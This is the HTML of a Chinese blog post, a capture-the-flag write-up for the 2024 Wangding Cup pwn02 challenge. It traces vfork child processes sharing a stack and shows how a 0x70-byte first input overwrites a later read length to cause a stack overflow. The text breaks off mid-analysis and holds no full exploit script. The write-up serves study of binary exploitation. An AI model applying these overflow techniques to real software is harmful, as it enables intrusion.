@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-84TPQBH5EH');
+</script>
+<!-- End Google Analytics -->
+
+  
+  
+
+  
+  <title>【2024 网鼎杯】玄武组_pwn02 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="这题考察的还是对子进程与父进程之间堆栈的关系 debug部分参考的这位师傅 https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;ngdtDGE8bGVe6v3GTrH1rw  依照程式启动时输出的leave your name 查看string调用找到004019e9()  再追下，就到了main()中  看下调用顺序 应当是  12300401931() -&gt; 004019e9()  但">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【2024 网鼎杯】玄武组_pwn02">
+<meta property="og:url" content="http://example.com/2024/11/09/wd-xw-pwn-02/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="这题考察的还是对子进程与父进程之间堆栈的关系 debug部分参考的这位师傅 https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;ngdtDGE8bGVe6v3GTrH1rw  依照程式启动时输出的leave your name 查看string调用找到004019e9()  再追下，就到了main()中  看下调用顺序 应当是  12300401931() -&gt; 004019e9()  但">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wpimages/2024/pwn/2024-wd-xw-pwn2/background.jpg">
+<meta property="article:published_time" content="2024-11-09T08:28:11.000Z">
+<meta property="article:modified_time" content="2024-11-12T12:55:25.234Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wpimages/2024/pwn/2024-wd-xw-pwn2/background.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/backgroup.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Hexo </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/avatar.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Flower </div>
+      <div class="dot"></div>
+      <div class="subtitle">Hi Im Flower </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+    
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
+    </div>
+  </div>
+
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/cloud/">
+                cloud
+                <div class="category-count">2</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-5/">
+                htb-Season-5
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-6/">
+                htb-Season-6
+                <div class="category-count">6</div>
+            </a>
+        
+            <a class="category-link" href="/categories/htb-Season-4/">
+                htb-Season-4
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/categories/ctf/">
+                ctf
+                <div class="category-count">4</div>
+            </a>
+        
+            <a class="category-link" href="/categories/Sherlocks/">
+                Sherlocks
+                <div class="category-count">1</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Recent Posts</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2024/11/09/wd-xw-pwn-02/" title="【2024 网鼎杯】玄武组_pwn02" >
+            <div class="recent-link-text">
+              【2024 网鼎杯】玄武组_pwn02
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/10/19/cc1-q/" title="cc-一些容易混淆的点" >
+            <div class="recent-link-text">
+              cc-一些容易混淆的点
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/10/16/src-Long-Supply-ChainAttack-1/" title="record-双供应链拿一个目标" >
+            <div class="recent-link-text">
+              record-双供应链拿一个目标
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/09/18/ABP-Framework-Vulnerable-to-API-Interface-Information-Leak/" title="Framework-API-Interface-Information-Leak" >
+            <div class="recent-link-text">
+              Framework-API-Interface-Information-Leak
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/09/16/box-wp-Caption/" title="【season-6】 htb Caption wp" >
+            <div class="recent-link-text">
+              【season-6】 htb Caption wp
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-wd-xw-pwn-02" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+<div class="article-gallery">
+  <div class="article-gallery-photos">
+    
+      <a class="article-gallery-img" rel="gallery_cm3ed4z2k0000dgkyf9q43sa8">
+        <img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/background.jpg" itemprop="image">
+      </a>
+    
+  </div>
+</div>
+
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        【2024 网鼎杯】玄武组_pwn02
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2024-11-09T08:28:11.000Z" itemprop="datePublished">2024-11-09</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/ctf/">ctf</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            5k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h2 id="这题考察的还是对子进程与父进程之间堆栈的关系"><a href="#这题考察的还是对子进程与父进程之间堆栈的关系" class="headerlink" title="这题考察的还是对子进程与父进程之间堆栈的关系"></a>这题考察的还是对子进程与父进程之间堆栈的关系</h2><blockquote>
+<p>debug部分参考的这位师傅</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ngdtDGE8bGVe6v3GTrH1rw">https://mp.weixin.qq.com/s/ngdtDGE8bGVe6v3GTrH1rw</a></p>
+</blockquote>
+<p>依照程式启动时输出的<code>leave your name</code></p>
+<p>查看<code>string</code>调用找到<code>004019e9()</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-66.png" alt="web1"></p>
+<p>再追下，就到了main()中</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-65.png" alt="web1"></p>
+<p>看下调用顺序</p>
+<p>应当是 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00401931() -&gt; 004019e9()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但神奇的是它在程式执行过程中，首先输出的是<code>004019e9</code>的<code>leave_your_name</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-67.png" alt="web1"></p>
+<p>而后才是<code>00401931</code>的<code>Wanna_return</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-68.png" alt="web1"></p>
+<p>实际上在gdb的debug时候这部分的逻辑有些乱，所以我换到ida之后发现，他会进入<code>401931()</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-69.png" alt="web1"></p>
+<p>而后执行到这里会<code>call 44EDF0</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-70.png" alt="web1"></p>
+<p><code>eax</code>给了<code>0x3a</code>这里是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#syscall</span><br><span class="line">rax：系统调用号</span><br><span class="line">rdi：第一个参数。</span><br><span class="line">rsi：第二个参数。</span><br><span class="line">rdx：第三个参数。</span><br><span class="line">r10：第四个参数。</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">58	common	vfork			sys_vfork</span><br></pre></td></tr></table></figure>
+
+<p>所以这里是<code>syscall_vfork</code>创建一个子进程</p>
+<p>在其中他会<code>sys_vfork</code>,创建一个新的子进程。</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-71.png" alt="web1"></p>
+<p>也就在这时，输出上看到第二个func的内容被输出了。</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-2.png" alt="web1"></p>
+<p>这让我有点懵了，我能想到可能是子进程去执行了<code>401931()</code>,而父进程是在子进程之后才执行的自己的输出。</p>
+<p>但我感觉这明显是不合理，子进程正常是会从父进程继续往下走，也就是说子进程也会去先输出父进程<code>401931()</code>之后的内容。</p>
+<p>但现在执行的现象就是如此，没办法只能从先输出内容的<code>func.004019e9</code>来看</p>
+<p>先观察<code>004019e9</code>的逻辑</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-72.png" alt="web1"></p>
+<p>debug进入到他的read发现他会读入<code>0x40</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-73.png" alt="web1"></p>
+<p>而后<code>004019e9</code>进程继续执行的话就会执行到<code>sys_exit</code>,整个主进程的逻辑就结束了</p>
+<p>那既然vfork的子进程会和主进程共用一个栈，那问题可能会发生在主进程派生子进程的位置，也就是刚刚<code>func.00401931()</code>的<code>sys_vfork</code>位置，就是子进程开始执行的位置。</p>
+<p>让我们返回<code>func.00401931()</code>仔细看下，会发现在子进程执行回来的路径上有一个<code>cmp 1</code>他会跳向ret的位子，以及还有一个<code>cmp     dword [var_2ch], 0</code>也可以做到。</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-74.png" alt="web1"><br><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-75.png" alt="web1"></p>
+<p>这是一个肥肠怪异的事情，他在主进程的时候满足了很多个点可以跳到<code>ret</code>然后返回到main执行</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-76.png" alt="web1"></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-77.png" alt="web1"></p>
+<p>那这里为什么又要单独写一个<code>cmp 1</code>来做<code>je</code>跳转到<code>ret</code></p>
+<p>再进入子进程看下</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-78.png" alt="web1"></p>
+<p>然后到跳<code>cmp 1</code>的部分看下<em>因为我这里一开始用的p64(2)来填充的，不难看出这个位置其实就是我们最初<code>leave_your_name</code>输入的内容</em></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-79.png" alt="web1"></p>
+<p>这里是<code>cmp 1</code>没成立，然后再跑了几下就到<code>nop</code>了，就error了，所以他存在意义就是为了让我们能通过<code>cmp 1</code>来到达<code>ret</code>，可以想到这就是出题人给我们的route.</p>
+<p>那就要看下子进程的这个<code>ret</code>返回的位置，不同于主进程，这里被放置了一个<code>0x040186b</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-80.png" alt="web1"></p>
+<p>修改payload填充<code>p64(1)</code>,到子进程继续执行到这里他返回到了<code>mian</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-81.png" alt="web1"></p>
+<p>第一阶段基本就这样了。</p>
+<hr>
+<p>这里有个<code>0x44edf0</code>，会再派生一个子进程</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/vfork_2.jpg" alt="web1"></p>
+<blockquote>
+<p>每个子线程在之后走到<code>00401a55</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/vfork_2_1.jpg" alt="web1"></p>
+<p>进入这里的<code>0044ee30</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/vfork_2_2.jpg" alt="web1"></p>
+<p>会执行<code>sys_exit</code>退出当前进程</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/vfork_2_3.jpg" alt="web1"></p>
+<p>所以他的目的就很明确就是为了让<code>0x44edf0</code>派生子线程于main这一段进行基于子进程派生之间的伪循环</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/fork_more.jpg" alt="web1"></p>
+</blockquote>
+<p>这里有个read，这里会触发一次读入</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-82.png" alt="web1"></p>
+<p>首次填入<code>b&#39;A&#39;</code>会在这里进行<code>syscall_read</code>到栈上，可以看到他给的<code>rdx</code>是<code>0x100</code> </p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-13.png" alt="web1"></p>
+<p>因为我只给了0x10个所以填入了 16个A</p>
+<p><code>0x7fffb1bd15b8</code>处</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-15.png" alt="web1"></p>
+<p>此时进入到这个函数中</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-16.png" alt="web1"></p>
+<p>栈除了最初的16个A之外还没别的被添加</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-17.png" alt="web1"></p>
+<p>在<code>0x401020</code>函数中继续走，我发现</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-18.png" alt="web1"></p>
+<p>（这一段我是另一个进程debug的所以<code>A</code>被写入的地址变了）<br>经过这里之后，我们原本输入的值又被再次写入到了下方</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-19.png" alt="web1"></p>
+<p>那可能就是这一块出了啥问题，导致我们的输入又被写入了一次</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-20.png" alt="web1"></p>
+<p>1.先把rsi写入到xmm2</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-21.png" alt="web1"></p>
+<p>2.把<code>rsi + rdx - 0xf</code>指向的写到<code>xmm3</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-22.png" alt="web1"></p>
+<p>这个<code>rsi + rdx - 0xf</code>指向的我们输入的第5个字节-第8个字节</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-24.png" alt="web1"></p>
+<p>不过这里并没有对地址进行写入 所以不是这里</p>
+<p>3.这里他将xmm2的内容也就是我们输入的那部分，写入到了<code>rdi</code>的地址</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-23.png" alt="web1"></p>
+<p>这里rdi是<code>0x7ffc2d9696a8</code>，目前还没写，执行之后，这里就被再次写入了</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-26.png" alt="web1"></p>
+<p>再往下走这个进程就结束了</p>
+<p>那我们现在的疑问就是在他下一个子进程中栈会发生什么变化</p>
+<p>继续往下走看接下来的子进程（我这个子线程开时间长了gdb会崩溃，所以重新又开了个进程，被写入的栈地址和上面的对不上）</p>
+<p>走了两步发现这里从<code>rbp - 0x118</code>取了个值</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-25.png" alt="web1"></p>
+<p>可以看到他在这个地址上存了个<code>0x100</code>,这个内存地址正好是在我们第一轮输入之前，不过刚刚xmm2写入的位置确是又位于他之前，也就代表可能这个位置在xmm2写入的时候会被覆盖到</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-27.png" alt="web1"></p>
+<p>不过这个覆盖了又该做什么用处呢，带着这个疑问接着往下走</p>
+<p>可以看到他这里下面进入了<code>0x44f810</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-28.png" alt="web1"></p>
+<p><code>0x44f810</code>其中会<code>syscall</code>调用<code>read</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-29.png" alt="web1"></p>
+<p>此时我们看下它每个参数到在<code>syscall_read</code>是代表的什么</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-30.png" alt="web1"></p>
+<p>可见<code>rdx</code>代表了被读入的长度,<code>rsi</code>是要写入的目标地址</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-31.png" alt="web1"></p>
+<p>然后就写入了，这里如果能利用<code>xmm2</code>的写入覆盖掉<code>0x100</code>也就是写入长度,那就可以在第二轮<code>once</code>写入的时候实现溢出</p>
+<p>有点好奇，返回来看了下xmm2写入的地址<code>rdi</code>是怎么确定的，看下来发现是</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-33.png" alt="web1"></p>
+<p>跟到xmm2写入之后的rdi也正是<code>rbp-0x50</code>的位置，</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-34.png" alt="web1"></p>
+<p>让我们再一次回到xmm2写入的地方计算一下</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-35.png" alt="web1"></p>
+<p>此时rdi也就是马上xmm2要写入的地址<code>0x7ffce77ccfd0</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-36.png" alt="web1"></p>
+<p><code>0x100</code>在<code>0x7ffce77cd040</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/d 0x7ffce77cd040-0x7ffce77ccfd0</span><br><span class="line">$1 = 112</span><br><span class="line"></span><br><span class="line">&gt;hex(112)</span><br><span class="line">0x70</span><br></pre></td></tr></table></figure>
+
+<p>也就说明只要初次<code>once</code>时允许写入<code>&#39;A&#39; * 0x70</code>就可以覆盖到之后，其他子进程read时rdx的长度取值</p>
+<p>那我们就要回到初次写入时，看<code>read</code>的数量是否<code>&gt;=0x70</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-37.png" alt="web1"></p>
+<p>可以看到最初这里允许read<code>0x100</code>个那妥妥是够了</p>
+<p>所以我们直接输入<code>0x70</code>个字符，当然这里为了方便看我在最后的8位替换为1</p>
+<p>又回到xmm2二次写入这里（不知道为啥这一遍调试时候xmm2不见了，为了方便记忆还是叫这部分xmm2把）</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-38.png" alt="web1"></p>
+<p>看到原本0x100的位置成功被我们覆盖</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-39.png" alt="web1"></p>
+<p>继续跟进，不出意外这次我们的子进程的<code>rdx</code>取值部分就会被覆盖，从而使得我们的read字节数量应当为<code>0x11111111</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-40.png" alt="web1"></p>
